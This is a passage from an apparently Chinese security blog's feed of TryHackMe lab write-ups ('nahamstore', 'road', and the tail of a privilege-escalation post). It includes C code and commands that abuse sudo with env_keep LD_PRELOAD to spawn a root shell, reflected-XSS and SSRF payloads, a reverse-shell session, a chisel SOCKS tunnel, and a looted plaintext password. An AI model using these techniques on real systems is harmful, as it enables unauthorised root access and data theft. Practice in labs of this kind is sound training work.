environment （环境） 选项。<br>D_PRELOAD 是一个允许任何程序使用共享库的函数。这<a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">篇博文</a>将让您了解 LD_PRELOAD 的功能。如果启用了 “env_keep” 选项，我们可以生成一个共享库，该库将在程序运行之前加载和执行。请注意，如果真实用户 ID 与有效用户 ID 不同，LD_PRELOAD选项将被忽略。  </p><p>此权限提升向量的步骤可以总结如下;</p><ol><li>检查LD_PRELOAD（使用 env_keep 选项）</li><li>编写编译为共享对象（.so 扩展名）文件的简单 C 代码</li><li>使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序</li></ol><p>C 代码将简单地生成一个根 shell，并且可以按如下方式编写;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;sys/types.h&gt;  </span><br><span class="line">#include &lt;stdlib.h&gt;  </span><br><span class="line">  </span><br><span class="line">void _init() &#123;  </span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);  </span><br><span class="line">setgid(0);  </span><br><span class="line">setuid(0);  </span><br><span class="line">system(&quot;/bin/bash&quot;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以将此代码保存为 shell.c，并使用以下参数使用 gcc 将其编译成共享对象文件;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br></pre></td></tr></table></figure><p>现在，我们可以在启动用户可以使用 sudo 运行的任何程序时使用此共享对象文件。在我们的例子中，可以使用 Apache2、find 或几乎所有我们可以使用 sudo 运行的程序。</p><p>我们需要通过指定 LD_PRELOAD 选项来运行程序，如下所示;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</span><br></pre></td></tr></table></figure><p>这将导致生成具有 root 权限的 shell。</p><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gatekeeper-thm</title>
      <link href="/2024/11/17/gatekeeper/"/>
      <url>/2024/11/17/gatekeeper/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="8687ea429cc0063eecac62b9c5f5facc1cc19c9afa5448561c800c4bf18eb0f2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
            <tag> #smb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nahamstore</title>
      <link href="/2024/11/16/nahamstore/"/>
      <url>/2024/11/16/nahamstore/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：中<br>描述：在这个房间里，您将学习漏洞赏金狩猎和 Web 应用程序黑客的基础知识<br>前置条件：</p></blockquote><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.100.228</td></tr><tr><td>OS</td><td>kali</td><td>linux</td></tr><tr><td>NahamStore 的创建是为了测试您通过 <a href="https://twitter.com/nahamsec">NahamSec 的</a>“漏洞赏金狩猎和 Web 应用程序黑客简介”<a href="http://bugbounty.nahamsec.training/">Udemy 课程</a>所学到的知识。 部署机器，获得 IP 地址后，请继续下一步！</td><td></td><td></td></tr></tbody></table><p>由 <a href="https://twitter.com/NahamSec">@NahamSec</a> 创建的 Udemy 课程 | 由 <a href="https://twitter.com/adamtlangley">@adamtlangley</a> 创建的实验室</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>子域枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://nahamstore.thm -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -H &quot;Host: FUZZ.nahamstore.thm&quot; -fw 125</span><br><span class="line"></span><br><span class="line">shop                    [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 732ms]</span><br><span class="line">www                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 311ms]</span><br><span class="line">marketing               [Status: 200, Size: 2025, Words: 692, Lines: 42, Duration: 353ms]</span><br><span class="line">stock                   [Status: 200, Size: 67, Words: 1, Lines: 1, Duration: 415ms]</span><br><span class="line">WWW                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 413ms]</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>截至目前我发现了三个在线站点</p><p><a href="http://nahamstore.thm/">http://nahamstore.thm/</a><br><a href="http://marketing.nahamstore.thm/">http://marketing.nahamstore.thm/</a><br><a href="http://stock.nahamstore.thm/">http://stock.nahamstore.thm/</a></p><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://marketing.nahamstore.thm/?error=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nahamstore.thm/product?id=1&amp;name=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nahamstore.thm/search?q=%27%2Balert(1)%2B%27</span><br></pre></td></tr></table></figure><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nahamstore.thm/product?id=2</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241116225922.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116225922.png"></a></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /stockcheck HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: nahamstore.thm</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">Content-Length: 69</span><br><span class="line"></span><br><span class="line">Origin: http://nahamstore.thm</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Referer: http://nahamstore.thm/product?id=2</span><br><span class="line"></span><br><span class="line">Cookie: session=023eb953d53167fef31a620a71d256d9; token=7708256ecdefdd7e793acf8e488e9be9</span><br><span class="line"></span><br><span class="line">Priority: u=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">product_id=2&amp;server=stock.nahamstore.thm@internal-api.nahamstore.thm#</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241117002121.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241117002121.png"></a></p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><a href="/../assets/img/Pasted%20image%2020241117003240.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241117003240.png"></a></p><h3 id="RCE2"><a href="#RCE2" class="headerlink" title="RCE2"></a>RCE2</h3><p><a href="/../assets/img/Pasted%20image%2020241117005007.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241117005007.png"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><ol><li>子域枚举</li><li>目录枚举</li><li>内容发现</li><li>模糊测试 GET &amp; POST 参数</li><li>XSS（跨站点脚本）</li><li>XSS 旁路</li><li>存储型 XSS、反射型 XSS</li><li>打开重定向</li><li>CSRF（跨站点请求伪造）</li><li>CSRF 保护绕过</li><li>IDOR （不安全的直接对象引用）</li><li>LFI （本地文件包含）</li><li>LFI 旁路</li><li>SSRF（服务器端请求伪造）</li><li>SSRF 旁路</li><li>XXE（XML 外部实体注入）</li><li>通过 XLSX 文件进行盲 XXE</li><li>RCE （远程代码执行）</li><li>密码猜测</li><li>编辑页面以获取 PHP 反向 shell</li><li>命令注入</li><li>基于错误的 SQL 注入</li><li>基于盲目的 SQL 注入</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>加深了漏洞出现点和如何<code>burpsuite</code>的一些技巧。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>road</title>
      <link href="/2024/11/16/road/"/>
      <url>/2024/11/16/road/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：中等<br>描述：像往常一样，获取 user 和 root 标志。<br>前置条件：</p></blockquote><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.177.40</td></tr><tr><td>OS</td><td>kali</td><td>Linux</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.141.52:22</span><br><span class="line">Open 10.10.141.52:80</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.141.52/v2/index.php</span><br><span class="line">http://10.10.141.52/phpMyAdmin/</span><br></pre></td></tr></table></figure><h3 id="cms识别"><a href="#cms识别" class="headerlink" title="cms识别"></a>cms识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ whatweb http://10.10.141.52/phpMyAdmin/                                             </span><br><span class="line">http://10.10.141.52/phpMyAdmin/ [200 OK] Apache[2.4.41], Bootstrap, Content-Security-Policy[default-src &#x27;self&#x27; ;options inline-script eval-script;referrer no-referrer;img-src &#x27;self&#x27; data:  *.tile.openstreetmap.org;object-src &#x27;none&#x27;;,default-src &#x27;self&#x27; ;script-src &#x27;self&#x27;  &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;;referrer no-referrer;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; ;img-src &#x27;self&#x27; data:  *.tile.openstreetmap.org;object-src &#x27;none&#x27;;], Cookies[phpMyAdmin,pma_lang], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpMyAdmin,pma_lang], IP[10.10.141.52], JQuery, PasswordField[pma_password], Script[text/javascript], Title[phpMyAdmin], UncommonHeaders[x-ob_mode,referrer-policy,content-security-policy,x-content-security-policy,x-webkit-csp,x-content-type-options,x-permitted-cross-domain-policies,x-robots-tag], X-Frame-Options[DENY], X-UA-Compatible[IE=Edge], X-XSS-Protection[1; mode=block], phpMyAdmin[5.1.0]</span><br><span class="line">     </span><br></pre></td></tr></table></figure><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WordPress Plugin Portable phpMyAdmin - Authentication Bypass                                  | php/webapps/23356.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="/assets/img/Pasted%20image%2020241116204109.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116204109.png"></a></p><p>文件上传处<br><a href="/assets/img/Pasted%20image%2020241116204150.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116204150.png"></a></p><p>有个重置用户的密码处</p><p>可以修改<code>admin@sky.thm</code> 的密码吗</p><p>可以修改</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用admind的账号进行上传和反弹shell</p><p><code>任意文件上传</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 10.10.141.52 35518</span><br><span class="line">Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 12:56:49 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ </span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>获取了，可以进行shell维持</p><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@sky:/$ ss -tnlu</span><br><span class="line">ss -tnlu</span><br><span class="line">Netid     State      Recv-Q     Send-Q              Local Address:Port            Peer Address:Port     Process     </span><br><span class="line">udp       UNCONN     0          0                   127.0.0.53%lo:53                   0.0.0.0:*                    </span><br><span class="line">udp       UNCONN     0          0               10.10.141.52%eth0:68                   0.0.0.0:*                    </span><br><span class="line">tcp       LISTEN     0          4096                127.0.0.53%lo:53                   0.0.0.0:*                    </span><br><span class="line">tcp       LISTEN     0          128                       0.0.0.0:22                   0.0.0.0:*                    </span><br><span class="line">tcp       LISTEN     0          70                      127.0.0.1:33060                0.0.0.0:*                    </span><br><span class="line">tcp       LISTEN     0          511                     127.0.0.1:9000                 0.0.0.0:*                    </span><br><span class="line">tcp       LISTEN     0          4096                    127.0.0.1:27017                0.0.0.0:*                    </span><br><span class="line">tcp       LISTEN     0          151                     127.0.0.1:3306                 0.0.0.0:*                    </span><br><span class="line">tcp       LISTEN     0          511                             *:80                         *:*                    </span><br><span class="line">tcp       LISTEN     0          128                          [::]:22                      [::]:*                    </span><br></pre></td></tr></table></figure><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>kali启动服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 8888 --reverse</span><br><span class="line"></span><br><span class="line">2024/11/16 21:28:51 server: Reverse tunnelling enabled</span><br><span class="line">2024/11/16 21:28:51 server: Fingerprint CPyZ11V0OUg5OOq3hTjFuiTChTaWgj0fUQFRwWyvdTU=</span><br><span class="line">2024/11/16 21:28:51 server: Listening on http://0.0.0.0:8888</span><br><span class="line">2024/11/16 21:30:07 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)</span><br><span class="line">2024/11/16 21:30:07 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目标机器启动客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@sky:/tmp$ ./chisel client 10.17.5.121:8888 R:</span><br><span class="line">socks</span><br></pre></td></tr></table></figure><p>大致流程</p><p>kali启动服务端，目标机器连接服务端， 服务端启动一个socks代理<br>proxychains <code>127.0.0.1:1080</code> 进行内网渗透</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@HACK ~# proxychains rustscan -a 127.0.0.1 -p 27017</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="line">The Modern Day Port Scanner.</span><br><span class="line">________________________________________</span><br><span class="line">: http://discord.skerritt.blog         :</span><br><span class="line">: https://github.com/RustScan/RustScan :</span><br><span class="line"> --------------------------------------</span><br><span class="line">Scanning ports: The virtual equivalent of knocking on doors.</span><br><span class="line"></span><br><span class="line">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span><br><span class="line">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="line">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:27017-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Open 127.0.0.1:27017</span><br><span class="line">[~] Starting Script(s)</span><br><span class="line">[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-16 21:50 HKT</span><br><span class="line">Initiating SYN Stealth Scan at 21:50</span><br><span class="line">Scanning localhost (127.0.0.1) [1 port]</span><br><span class="line">Completed SYN Stealth Scan at 21:50, 0.02s elapsed (1 total ports)</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up, received localhost-response (0.000065s latency).</span><br><span class="line">Scanned at 2024-11-16 21:50:45 HKT for 0s</span><br><span class="line"></span><br><span class="line">PORT      STATE  SERVICE REASON</span><br><span class="line">27017/tcp closed mongod  reset ttl 64</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds</span><br><span class="line">           Raw packets sent: 1 (44B) | Rcvd: 2 (84B)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ mongo --port 27017</span><br><span class="line">MongoDB shell version v4.4.6</span><br><span class="line">connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb</span><br><span class="line">Implicit session: session &#123; &quot;id&quot; : UUID(&quot;65039ed9-60ef-4a2c-a5d3-9271c3de8923&quot;) &#125;</span><br><span class="line">MongoDB server version: 4.4.6</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">MongoDB server version: 4.4.6</span><br><span class="line">show databases;</span><br><span class="line">admin   0.000GB</span><br><span class="line">backup  0.000GB</span><br><span class="line">config  0.000GB</span><br><span class="line">local   0.000GB</span><br><span class="line">use backup;</span><br><span class="line">switched to db backup</span><br><span class="line">show tables;</span><br><span class="line">collection</span><br><span class="line">user</span><br><span class="line">select * from user;</span><br><span class="line">uncaught exception: SyntaxError: unexpected token: identifier :</span><br><span class="line">@(shell):1:14</span><br><span class="line">show collections</span><br><span class="line">collection</span><br><span class="line">user</span><br><span class="line">db.user.find()</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60ae2661203d21857b184a76&quot;), &quot;Month&quot; : &quot;Feb&quot;, &quot;Profit&quot; : &quot;25000&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60ae2677203d21857b184a77&quot;), &quot;Month&quot; : &quot;March&quot;, &quot;Profit&quot; : &quot;5000&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60ae2690203d21857b184a78&quot;), &quot;Name&quot; : &quot;webdeveloper&quot;, &quot;Pass&quot; : &quot;BahamasChapp123!@#&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60ae26bf203d21857b184a79&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;EndDate&quot; : &quot;December&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60ae26d2203d21857b184a7a&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;Salary&quot; : &quot;30000&quot; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webdeveloper@sky:/$ whoami</span><br><span class="line">whoami</span><br><span class="line">webdeveloper</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webdeveloper</span><br><span class="line">webdeveloper@sky:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for webdeveloper on sky:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User webdeveloper may run the following commands on sky:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility</span><br></pre></td></tr></table></figure><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p><a href="https://whitecr0wz.github.io/posts/LD_PRELOAD/">https://whitecr0wz.github.io/posts/LD_PRELOAD/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 